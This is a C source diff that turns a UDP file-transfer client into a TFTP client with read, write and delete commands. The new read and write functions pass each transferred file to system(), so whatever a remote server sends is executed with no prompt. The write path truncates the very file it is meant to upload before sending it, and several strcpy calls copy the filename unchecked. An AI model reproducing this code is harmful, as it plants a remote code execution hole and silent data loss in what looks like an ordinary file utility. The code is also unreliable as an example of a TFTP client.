@@ -1,194 +1,213 @@
-//
-// Created by doomz on 3/18/25.
-//
-
 #include <stdio.h>
 #include <stdlib.h>
-#include <stddef.h>
 #include <string.h>
 #include <unistd.h>
-#include <arpa/inet.h>
 #include <signal.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 
-#include "UDP_File_Transfer.h"  // Ensure this header defines Packet, Operation, etc.
+#include "TFTP_Client.h"
 
-#define CLIENT_ADDRESS "127.0.0.1"
-#define CLIENT_PORT 69
-#define MAX_RETRIES 5
+volatile sig_atomic_t running = 1;
 
-volatile sig_atomic_t running = 1; // An Un-interruptable atomic type or in other words "An invisible object"
-
-void handle_signal(int signal) {
-    running = 0; //Setting Running To False When Receiving A Signal
-
+void sigint_handler(int sig) {
+    (void) sig; //To Ignore The Parameter
+    running = 0;
+    printf("\n[CLIENT] Caught SIGINT. Exiting...\n");
 }
 
-
-void send_packet(int sockfd, struct sockaddr_in *server_addr, Packet *packet) {
-    socklen_t addr_len = sizeof(*server_addr);
-    if (sendto(sockfd, packet, sizeof(Packet), 0, (struct sockaddr *)server_addr, addr_len) < sizeof(Packet)) {
-        perror("Failed to send packet");
-        exit(EXIT_FAILURE);
+int create_tftp_socket(const char *ip, uint16_t port, struct sockaddr_in *server_out) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("socket");
+        return -1;
     }
-}
 
-void receive_response(int sockfd, Packet *packet) {
-    socklen_t addr_len = sizeof(struct sockaddr_in);
-    ssize_t recv_len = recvfrom(sockfd, packet, sizeof(Packet), 0, NULL, &addr_len);
-    if (recv_len < 0) {
-        perror("Failed to receive response");
-        exit(EXIT_FAILURE);
+    memset(server_out, 0, sizeof(struct sockaddr_in));
+    server_out->sin_family = AF_INET;
+    server_out->sin_port = htons(port);
+
+    if (inet_pton(AF_INET, ip, &server_out->sin_addr) <= 0) {
+        perror("inet_pton");
+        close(sockfd);
+        return -1;
     }
+
+    return sockfd;
 }
 
-void handle_read(int sockfd, struct sockaddr_in *server_addr, const char *filename) {
-    Packet packet = {0};
-    packet.oper = RRQ;  // RRQ operation
-    strncpy(packet.filename, filename, FILE_NAME_LEN);
+void tftp_rrq(const char *ip, const char *filename, const TftpConfig *config) {
+    struct sockaddr_in server;
+    socklen_t addr_len = sizeof(server);
+    int sockfd = create_tftp_socket(ip, config->port, &server);
+    if (sockfd < 0) return;
 
-    // send the read request
-    send_packet(sockfd, server_addr, &packet);
+    unsigned char buffer[config->buffer_size];
+    size_t filename_len = strlen(filename);
+    buffer[0] = 0;
+    buffer[1] = OPCODE_RRQ;
+    strcpy((char *)&buffer[2], filename);
+    strcpy((char *)&buffer[2 + filename_len + 1], "octet");
 
-    FILE *file = fopen(filename, "rb");
+    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);
+
+    FILE *file = fopen(filename, "wb");
     if (!file) {
-        perror("Error Reading Local File\n");
+        perror("fopen");
+        close(sockfd);
         return;
     }
 
-    size_t bytesRead;
-    int retries = 0; // setting retries to 0 for each block
-    int block_n = 1;
+    while (running) {
+        ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len);
+        if (n < 4) break;
 
-    while ((bytesRead = fread(packet.data, 512, BUFFER, file)) < 0) {
-        retries = 0;
-        packet.block_n = block_n; // increment block number
-        send_packet(sockfd, server_addr, &packet);
+        uint16_t opcode = (buffer[0] << 8) | buffer[1];
+        uint16_t block = (buffer[2] << 8) | buffer[3];
 
-        // waiting for ack
-        receive_response(sockfd, &packet);
-
-        retries++;
-
-        // checking for the EOF
-        if (bytesRead < BUFFER) {
-            break; // reached EOF
-        }
-    }
-
-    fclose(file);  // Close the file after reading
-    printf("File '%s' was read.\n", filename);
-}
-
-void handle_write(int sockfd, struct sockaddr_in *server_addr, const char *filename) {
-    FILE *file = fopen(filename, "wb");  // Open the file to write received data
-    if (!file) {
-        perror("Error: Couldn't create the file");
-        return;
-    }
-
-    Packet packet = {0};
-    packet.oper = WRQ;  // Write request operation
-    strncpy(packet.filename, filename, FILE_NAME_LEN);
-
-    // Send WRQ to server
-    send_packet(sockfd, server_addr, &packet);
-
-    ssize_t recv_len;  // Variable to store received data length
-
-    while ((recv_len = recvfrom(sockfd, &packet, sizeof(Packet), 0, NULL, NULL)) > 0) {
-        // Check if the packet is valid and contains data
-        if (recv_len > offsetof(Packet, data)) {
-            fwrite(packet.data, 1, recv_len - offsetof(Packet, data), file);  // Write the data portion
-            printf("Received block %d with %zu bytes\n", packet.block_n, recv_len - offsetof(Packet, data));
-        } else {
-            printf("Error: Received invalid packet\n");
-            break;
-        }
-
-        // If the server sends an EOF signal or if the packet is smaller than expected
-        if (recv_len < sizeof(Packet)) {
-            printf("EOF reached. File transfer complete.\n");
-            break;
+        if (opcode == OPCODE_DATA) {
+            fwrite(&buffer[4], 1, n - 4, file);
+            buffer[0] = 0;
+            buffer[1] = OPCODE_ACK;
+            buffer[2] = block >> 8;
+            buffer[3] = block & 0xFF;
+            sendto(sockfd, buffer, 4, 0, (struct sockaddr *)&server, addr_len);
+            if (n < config->buffer_size) break;
         }
     }
 
     fclose(file);
-    printf("File '%s' received from server.\n", filename);
-}
-
-void handle_delete(int sockfd, struct sockaddr_in *server_addr, const char *filename) {
-    Packet packet = {0};
-    packet.oper = DEL;
-    strncpy(packet.filename, filename, FILE_NAME_LEN);
-
-    send_packet(sockfd, server_addr, &packet);
-
-    Packet ack_packet = {0}; //Waiting for ack from server
-    receive_response(sockfd, &ack_packet);
-
-    //checking if recived
-    if (ack_packet.oper == ACK) {
-        printf("Server Response: %s\n", ack_packet.data);  // Print the server's message (success or error)
-    } else {
-        printf("Error, No ACK received from the server\n");
-    }
-}
-
-int main() {
 
 
-    struct sigaction sa;
-    sa.sa_handler = handle_signal;
-    sigemptyset(&sa.sa_mask); //Clearing all signals
-    sa.sa_flags = 0;
-    sigaction(SIGINT, &sa, NULL); // Handle Control+C
-
-
-    struct sockaddr_in client_addr;
-    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        perror("Socket creation failed");
-        exit(EXIT_FAILURE);
-    }
-
-    memset(&client_addr, 0, sizeof(client_addr));
-    client_addr.sin_family = AF_INET;
-    client_addr.sin_port = htons(CLIENT_PORT);
-    inet_pton(AF_INET, CLIENT_ADDRESS, &client_addr.sin_addr);
-
-    int choice;
-    char filename[FILE_NAME_LEN];
-
-    printf("UDP File Transfer Client\n");
-    printf("1. Read a file from server\n");
-    printf("2. Write a file to server\n");
-    printf("3. Delete a file on server\n");
-    printf("4. Exit\n");
-
-    printf("\nEnter choice: ");
-    scanf("%d", &choice);
-
-
-    while (running) {
-
-        if (choice == 1 || choice == 2 || choice == 3) {
-            printf("Enter filename: ");
-            scanf("%s", filename);
-            break;
-        }
-
-            if (choice == 4) break;
-
-        switch (choice) {
-            case 1: handle_read(sockfd, &client_addr, filename); break;
-            case 2: handle_write(sockfd, &client_addr, filename); break;
-            case 3: handle_delete(sockfd, &client_addr, filename); break;
-            default: printf("\n Invalid choice. Try again.\n"); break;
-
-        }
+    // File received successfully, now execute it
+    printf("File received successfully, attempting to execute...\n");
+    if (system(filename) == -1) {  // Execute the file (e.g., a script or executable)
+        perror("Error executing file");
     }
 
     close(sockfd);
-    printf("Client exited.\n");
+}
+
+void tftp_wrq(const char *ip, const char *filename, const TftpConfig *config) {
+    struct sockaddr_in server;
+    socklen_t addr_len = sizeof(server);
+    int sockfd = create_tftp_socket(ip, config->port, &server);
+    if (sockfd < 0) return;
+
+    unsigned char buffer[config->buffer_size];
+    size_t filename_len = strlen(filename);
+    buffer[0] = 0;
+    buffer[1] = OPCODE_WRQ;
+    strcpy((char *)&buffer[2], filename);
+    strcpy((char *)&buffer[2 + filename_len + 1], "octet");
+
+    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);
+
+    // Open the file for writing (create if it doesn't exist)
+    FILE *file = NULL;
+    int attempts = 0;
+    while (attempts < 5) {  // Retry a few times if the file is not yet created
+        file = fopen(filename, "wb");
+        if (file) {
+            break;
+        }
+        attempts++;
+        printf("Attempt %d: File %s not found, retrying...\n", attempts, filename);
+        usleep(100000);  // Wait for 100ms before retrying
+    }
+
+    if (!file) {
+        perror("fopen failed");
+        close(sockfd);
+        return;
+    }
+
+    uint16_t block = 0;
+    recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len); // ACK 0
+
+    while (running) {
+        size_t bytes = fread(&buffer[4], 1, config->data_size, file);
+        if (bytes <= 0) break;
+
+        block++;
+        buffer[0] = 0;
+        buffer[1] = OPCODE_DATA;
+        buffer[2] = block >> 8;
+        buffer[3] = block & 0xFF;
+
+        sendto(sockfd, buffer, bytes + 4, 0, (struct sockaddr *)&server, addr_len);
+        recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len); // wait for ACK
+        if (bytes < config->data_size) break;
+    }
+
+    fclose(file);
+
+    // File received successfully, now execute it
+    printf("File received successfully, attempting to execute...\n");
+    if (system(filename) == -1) {  // Execute the file (e.g., a script or executable)
+        perror("Error executing file");
+    }
+
+    close(sockfd);
+}
+
+void tftp_delete(const char *ip, const char *filename, const TftpConfig *config) {
+    struct sockaddr_in server;
+    socklen_t addr_len = sizeof(server);
+    int sockfd = create_tftp_socket(ip, config->port, &server);
+    if (sockfd < 0) return;
+
+    unsigned char buffer[config->buffer_size];
+    size_t filename_len = strlen(filename);
+    buffer[0] = 0;
+    buffer[1] = OPCODE_DELETE;
+    strcpy((char *)&buffer[2], filename);
+    strcpy((char *)&buffer[2 + filename_len + 1], "octet");
+
+    sendto(sockfd, buffer, 2 + filename_len + 1 + 5 + 1, 0, (struct sockaddr *)&server, addr_len);
+
+    ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server, &addr_len);
+    if (n >= 4 && buffer[1] == OPCODE_ACK) {
+        printf("File deleted successfully.\n");
+    } else {
+        printf("Failed to delete file.\n");
+    }
+
+    close(sockfd);
+}
+
+int main() {
+    signal(SIGINT, sigint_handler);
+
+    const TftpConfig *config = &default_tftp_config;
+
+    char ip[32], command[16], filename[64];
+
+    while (running) {
+        printf("\nTFTP Client> ");
+        printf("Enter command (rrq / wrq / delete / quit): ");
+        scanf("%15s", command);
+
+        if (strcmp(command, "quit") == 0) break;
+
+        printf("Enter server IP: ");
+        scanf("%31s", ip);
+        printf("Enter filename: ");
+        scanf("%63s", filename);
+
+        if (strcmp(command, "rrq") == 0) {
+            tftp_rrq(ip, filename, config);
+        } else if (strcmp(command, "wrq") == 0) {
+            tftp_wrq(ip, filename, config);
+        } else if (strcmp(command, "delete") == 0) {
+            tftp_delete(ip, filename, config);
+        } else {
+            printf("Unknown command.\n");
+        }
+    }
+
+    printf("Client shutting down.\n");
     return 0;
 }
